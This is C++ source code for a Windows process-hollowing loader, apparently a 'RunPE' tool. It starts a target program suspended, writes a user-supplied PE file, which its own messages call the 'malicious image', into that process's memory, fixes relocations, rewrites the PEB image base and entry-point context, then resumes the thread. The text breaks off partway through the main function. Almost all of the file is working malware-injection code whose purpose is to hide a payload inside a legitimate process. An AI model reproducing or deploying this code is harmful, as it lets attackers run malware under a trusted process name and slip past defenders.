#include <Windows.h>
#include <cstdio>
#include <winternl.h>

LPSTR lpMalProcess;
LPSTR lpTargetProcess;

struct ProcessAddressInformation
{
	LPVOID lpProcessPEBAddress;
	LPVOID lpProcessImageBaseAddress;
};

typedef struct IMAGE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} IMAGE_RELOCATION_ENTRY, * PIMAGE_RELOCATION_ENTRY;

HANDLE RetrieveMalFIleContents(const LPSTR lpFilePath)
{
	const HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("-> PE file cannot be opened\n");
		CloseHandle(hFile);
		return nullptr;
	}

	const DWORD dFileSize = GetFileSize(hFile, nullptr);
	if (dFileSize == INVALID_FILE_SIZE)
	{
		printf("-> Not able to get size of the PE file!\n");
		CloseHandle(hFile);
		return nullptr;
	}

	const HANDLE hMalFileContent = HeapAlloc(GetProcessHeap(), 0, dFileSize);
	if (hMalFileContent == INVALID_HANDLE_VALUE)
	{
		printf("-> Not able to allocate memory to the PE file\n");
		CloseHandle(hFile);
		CloseHandle(hMalFileContent);
		return nullptr;
	}

	const BOOL bFileRead = ReadFile(hFile, hMalFileContent, dFileSize, nullptr, nullptr);
	if (!bFileRead)
	{
		printf("-> Not able to read PE file contents\n");
		CloseHandle(hFile);
		if (hMalFileContent != nullptr)
			CloseHandle(hMalFileContent);

		return nullptr;
	}

	CloseHandle(hFile);
	return hMalFileContent;
}

BOOL IsValidPE(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->Signature == IMAGE_NT_SIGNATURE)
		return TRUE;

	return FALSE;
}

BOOL IsPE32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
		return TRUE;

	return FALSE;
}

ProcessAddressInformation GetProcessAddressInformation32(const PPROCESS_INFORMATION lpPI)
{
	LPVOID lpImageBaseAddress = nullptr;
	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;
	Wow64GetThreadContext(lpPI->hThread, &CTX);
	//CTX.Ebx points to the PEB structure while (CTX.Ebx + 0x8) points to the ImageBaseAddress 
	const BOOL bReadBaseAddress = ReadProcessMemory(lpPI->hProcess, (LPVOID)(uintptr_t)(CTX.Ebx + 0x8), &lpImageBaseAddress, sizeof(DWORD), nullptr);
	if (!bReadBaseAddress)
		return ProcessAddressInformation{ nullptr, nullptr };

	return ProcessAddressInformation{ (LPVOID)(uintptr_t)CTX.Ebx, lpImageBaseAddress };
}


ProcessAddressInformation GetProcessAddressInformation64(const PPROCESS_INFORMATION lpPI)
{
	LPVOID lpImageBaseAddress = nullptr;
	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;
	GetThreadContext(lpPI->hThread, &CTX);
	//CTX.Rdx points to the PEB structure while (CTX.Rdx + 0x10) points to the ImageBaseAddress 
	const BOOL bReadBaseAddress = ReadProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageBaseAddress, sizeof(UINT64), nullptr);
	if (!bReadBaseAddress)
		return ProcessAddressInformation{ nullptr, nullptr };

	return ProcessAddressInformation{ (LPVOID)CTX.Rdx, lpImageBaseAddress };
}

/* "Subsystem" field indicates the context or environment in which the executable is intended to run. It defines how the operating system should prepare for and manage the execution of the executable.*/
DWORD GetSubsytem32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	return lpImageNTHeader->OptionalHeader.Subsystem;
}

DWORD GetSubsytem64(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	return lpImageNTHeader->OptionalHeader.Subsystem;
}

DWORD GetSubsystemEx32(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
{
	constexpr IMAGE_DOS_HEADER ImageDOSHeader = {};
	const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);
	if (!bGetDOSHeader)
	{
		printf("[Error] Not able to get the target DOS header.\n");
		return -1;
	}

	constexpr IMAGE_NT_HEADERS32 ImageNTHeader = {};
	const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS32), nullptr);
	if (!bGetNTHeader)
	{
		printf("[Error] Not able to get the target NT header.\n");
		return -1;
	}

	return ImageNTHeader.OptionalHeader.Subsystem;
}

DWORD GetSubsystemEx64(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
{
	constexpr IMAGE_DOS_HEADER ImageDOSHeader = {};
	const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);
	if (!bGetDOSHeader)
	{
		printf("[Error] Not able to get the target DOS header.\n");
		return -1;
	}

	constexpr IMAGE_NT_HEADERS64 ImageNTHeader = {};
	const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS64), nullptr);
	if (!bGetNTHeader)
	{
		printf("[Error] Not able to get the target NT header.\n");
		return -1;
	}

	return ImageNTHeader.OptionalHeader.Subsystem;
}

void CleanAndExitProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hMalFileContent)
{
	if (hMalFileContent != nullptr && hMalFileContent != INVALID_HANDLE_VALUE)
		HeapFree(GetProcessHeap(), 0, hMalFileContent);

	if (lpPI->hThread != nullptr)
		CloseHandle(lpPI->hThread);

	if (lpPI->hProcess != nullptr)
	{
		TerminateProcess(lpPI->hProcess, -1);
		CloseHandle(lpPI->hProcess);
	}
}

void CleanProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hMalFileContent)
{
	if (hMalFileContent != nullptr && hMalFileContent != INVALID_HANDLE_VALUE)
		HeapFree(GetProcessHeap(), 0, hMalFileContent);

	if (lpPI->hThread != nullptr)
		CloseHandle(lpPI->hThread);

	if (lpPI->hProcess != nullptr)
		CloseHandle(lpPI->hProcess);
}

BOOL HasRelocation32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return TRUE;

	return FALSE;
}

/* The Base Relocation Data Directory is essential for handling the relocation of addresses in the executable
	when it's loaded into memory at an address different from its preferred base address. If the condition is true,
	it implies that the PE file requires address relocation information to be applied when loading the executable into memory. */
BOOL HasRelocation64(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return TRUE;

	return FALSE;
}

//Retrieve the relocation address of the target process
IMAGE_DATA_DIRECTORY GetRelocAddress32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	return { 0, 0 };
}

//Retrieve the relocation address of the target process
IMAGE_DATA_DIRECTORY GetRelocAddress64(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	return { 0, 0 };
}

BOOL RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)(uintptr_t)lpImageNTHeader32->OptionalHeader.ImageBase, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		printf("[Error] Not able to allocate memory for the new image.\n");
		return FALSE;
	}

	printf("[Success] Memory allocated at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, (LPVOID)lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		printf("[Error] Not able to write the headers of the new image.\n");
		return FALSE;
	}

	printf("[Success] Headers written at : 0x%p\n", (LPVOID)(DWORD64)lpImageNTHeader32->OptionalHeader.ImageBase);

	for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			printf("[Error] Not able to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		printf("[Success] Section %s written at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = Wow64GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		printf("[Error] Not able to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpImageNTHeader32->OptionalHeader.ImageBase, sizeof(DWORD), nullptr);
	if (!bWritePEB)
	{
		printf("[Error] Not able to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

	const BOOL bSetContext = Wow64SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		printf("[Error] Not able to set the thread context.\n");
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}

BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		printf("[Error] Not able to allocate memory for the new image.\n");
		return FALSE;
	}

	printf("[Success] Memory allocated at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		printf("[Error] Not able to write the headers of the new image.\n");
		return FALSE;
	}

	printf("[Success] Headers written at : 0x%p\n", (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase);

	for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			printf("[Error] Not able to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		printf("[Success] Section %s written at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		printf("[Error] Not able to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
		printf("[Error] Not able to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

	const BOOL bSetContext = SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		printf("[Error] Not able to set the thread context.\n");
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}

BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		printf("[Error] Not able to allocate memory for the new image.\n");
		return FALSE;
	}

	printf("[Success] Memory allocated at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

	const DWORD DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader32->OptionalHeader.ImageBase;

	lpImageNTHeader32->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		printf("[Error] Not able to write the headers of the new image.\n");
		return FALSE;
	}

	printf("[Success] Headers written at : 0x%p\n", lpAllocAddress);

	const IMAGE_DATA_DIRECTORY ImageDataReloc = GetRelocAddress32(lpImage);
	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;

		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			printf("[Error] Not able to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		printf("[Success] Section %s written at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	if (lpImageRelocSection == nullptr)
	{
		printf("[Error] Not able to get the relocation section of the source image.\n");
		return FALSE;
	}

	printf("[Success] Relocation section : %s\n", (char*)lpImageRelocSection->Name);

	DWORD RelocOffset = 0;

	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD PatchedAddress = 0;

			ReadProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);

			PatchedAddress += DeltaImageBase;

			WriteProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);

		}
	}

	printf("[Success] Relocations done.\n");

	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = Wow64GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		printf("[Error] Not able to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpAllocAddress, sizeof(DWORD), nullptr);
	if (!bWritePEB)
	{
		printf("[Error] Not able to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

	const BOOL bSetContext = Wow64SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		printf("[Error] Not able to set the thread context.\n");
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}

BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		printf("[Error] Not able to allocate memory for the new image.\n");
		return FALSE;
	}

	printf("[Success] Memory allocated at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

	const DWORD64 DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader64->OptionalHeader.ImageBase;

	lpImageNTHeader64->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		printf("[Error] Not able to write the headers of the new image.\n");
		return FALSE;
	}

	printf("[Success] Headers written at : 0x%p\n", lpAllocAddress);

	const IMAGE_DATA_DIRECTORY ImageDataReloc = GetRelocAddress64(lpImage);
	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;


		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			printf("[Error] Not able to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		printf("[Success] Section %s written at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	if (lpImageRelocSection == nullptr)
	{
		printf("[Error] Not able to get the relocation section of the source image.\n");
		return FALSE;
	}

	printf("[Success] Relocation section : %s\n", (char*)lpImageRelocSection->Name);

	DWORD RelocOffset = 0;

	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD64 PatchedAddress = 0;

			ReadProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);

			PatchedAddress += DeltaImageBase;

			WriteProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);

		}
	}

	printf("[Success] Relocations done.\n");

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		printf("[Error] Not able to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
		printf("[Error] Not able to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

	const BOOL bSetContext = SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		printf("[Error] Not able to set the thread context.\n");
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}

int main(const int argc, char* argv[])
{
	if (argc == 3)
	{
		lpMalProcess = argv[1];
		lpTargetProcess = argv[2];
	}
	else
	{
		printf("[HELP] runpe.exe <pe_file> <target_process>\n");
		return -1;
	}

	printf("HOLLOWING...\n");

	const LPVOID hMalFileContent = RetrieveMalFIleContents(lpMalProcess);
	if (hMalFileContent == nullptr)
		return -1;

	printf("[Success] PE file content : 0x%p\n", (LPVOID)(uintptr_t)hMalFileContent);

	const BOOL bPE = IsValidPE(hMalFileContent);
	if (!bPE)
	{
		printf("x The PE file is not valid !\n");
		if (hMalFileContent != nullptr)
			HeapFree(GetProcessHeap(), 0, hMalFileContent);
		return -1;
	}

	printf("[Success] The PE file is valid.\n");

	STARTUPINFOA SI;
	PROCESS_INFORMATION PI;

	// Initialize the STARTUPINFO and PROCESS_INFORMATION structure.
	ZeroMemory(&SI, sizeof(SI));
	SI.cb = sizeof(SI);
	ZeroMemory(&PI, sizeof(PI));

	// Create the target process in suspended mode.
	const BOOL bProcessCreation = CreateProcessA(lpTargetProcess, nullptr, nullptr, nullptr, TRUE, CREATE_SUSPENDED, nullptr, nullptr, &SI, &PI);
	if (!bProcessCreation)
	{
		printf("[Error] Not able to create the target process !\n");
		CleanAndExitProcess(&PI, hMalFileContent);
		return -1;
	}


	BOOL bTarget32;
	// Check if the target process is x86 or x64.
	IsWow64Process(PI.hProcess, &bTarget32);

	ProcessAddressInformation ProcessAddressInformation = { nullptr, nullptr };

	// Read and write the PEB structure address and the image base address of the target image in the PEB
	if (bTarget32)
	{

		ProcessAddressInformation = GetProcessAddressInformation32(&PI);
		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
		{
			printf("[Error] Not able to fetch target image base address\n");
			CleanAndExitProcess(&PI, hMalFileContent);
			return -1;
		}
	}
	else
	{
		ProcessAddressInformation = GetProcessAddressInformation64(&PI);
		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
		{
			printf("[Error] Not able to fetch target image base address\n");
			CleanAndExitProcess(&PI, hMalFileContent);
			return -1;
		}
	}

	printf("[Success] Pointer to the target Process PEB : 0x%p\n", ProcessAddressInformation.lpProcessPEBAddress);
	printf("[Success] Pointer to the target Process Image Base : 0x%p\n", ProcessAddressInformation.lpProcessImageBaseAddress);

	const BOOL bSource32 = IsPE32(hMalFileContent);
	if (bSource32)
		printf("[Success] Malicious PE Image architecture : x86\n");
	else
		printf("[Success] Malicious PE Image architecture : x64\n");

	if (bTarget32)
		printf("[Success] Target PE Image architecture : x86\n");
	else
		printf("[Success] Target PE Image architecture : x64\n");

	if (bSource32 && bTarget32 || !bSource32 && !bTarget32)
		printf("[Success] Architecture are compatible !\n");
	else
	{
		printf("[Error] Architecture are not compatible !\n");
		return -1;
	}

	// Check if the source image has a relocation table.
	DWORD dwSourceSubsystem;

	if (bSource32)
		dwSourceSubsystem = GetSubsytem32(hMalFileContent);
	else
		dwSourceSubsystem = GetSubsytem64(hMalFileContent);

	if (dwSourceSubsystem == (DWORD)-1)
	{
		printf("[Error] Not able to get the subsytem of the Malicious image.\n");
		CleanAndExitProcess(&PI, hMalFileContent);
		return -1;
	}

	printf("[Success] Malicious Image subsystem : 0x%X\n", (UINT)dwSourceSubsystem);

	DWORD dwTargetSubsystem;
	if (bTarget32)
		dwTargetSubsystem = GetSubsystemEx32(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);
	else
		dwTargetSubsystem = GetSubsystemEx64(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);

	if (dwTargetSubsystem == (DWORD)-1)
	{
		printf("[Error]Not able to get the subsytem of the target process.\n");
		CleanAndExitProcess(&PI, hMalFileContent);
		return -1;
	}

	printf("[Success] Target Process subsystem : 0x%X\n", (UINT)dwTargetSubsystem);

	if (dwSourceSubsystem == dwTargetSubsystem)
		printf("[Success] Subsytems of Malicious Image and Target Image are compatible.\n");
	else
	{
		printf("[Error] Subsytems of Malicious Image and Target Image are NOT compatible.\n");
		CleanAndExitProcess(&PI, hMalFileContent);
		return -1;
	}

	// Check if the source image has a relocation table.
	BOOL bHasReloc;
	if (bSource32)
		bHasReloc = HasRelocation32(hMalFileContent);
	else
		bHasReloc = HasRelocation64(hMalFileContent);

